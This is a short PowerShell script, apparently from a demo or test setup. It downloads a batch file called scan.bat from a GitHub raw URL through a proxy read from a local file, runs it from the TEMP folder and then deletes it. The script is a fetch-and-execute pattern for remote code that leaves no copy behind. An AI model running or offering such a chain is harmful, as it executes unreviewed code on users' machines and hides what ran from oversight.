$proxy_url = Get-Content 'C:\CRDemo\proxy.txt'
Invoke-WebRequest "https://raw.githubusercontent.com/tameval/script/main/33667/proxy/scan.bat" -Proxy $proxy_url -OutFile $env:TEMP\scan.bat
Start-Process -Wait $env:TEMP\scan.bat
Remove-Item $env:TEMP\scan.bat
